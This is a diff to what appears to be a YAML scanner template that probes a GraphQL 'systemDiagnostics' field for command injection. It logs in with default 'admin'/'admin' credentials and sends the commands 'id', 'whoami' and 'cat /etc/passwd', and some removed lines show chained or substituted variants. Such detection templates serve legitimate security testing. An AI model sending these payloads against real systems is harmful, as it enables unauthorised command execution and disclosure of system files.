@@ -18,7 +18,7 @@ role_selector:
 
 graphql:
   - query: |
-      query CommandInjectionTest {
+      {
         systemDiagnostics(username: "admin", password: "admin", cmd: "id")
       }
     matchers:
@@ -30,8 +30,8 @@ graphql:
         condition: or
 
   - query: |
-      query CommandInjectionWhoami {
-        systemDiagnostics(username: "admin", password: "admin", cmd: "$(whoami)")
+      {
+        systemDiagnostics(username: "admin", password: "admin", cmd: "whoami")
       }
     matchers:
       - type: status
@@ -41,8 +41,8 @@ graphql:
         part: body
 
   - query: |
-      query CommandInjectionChain {
-        systemDiagnostics(username: "admin", password: "admin", cmd: "ls; cat /etc/passwd")
+      {
+        systemDiagnostics(username: "admin", password: "admin", cmd: "cat /etc/passwd")
       }
     matchers:
       - type: status
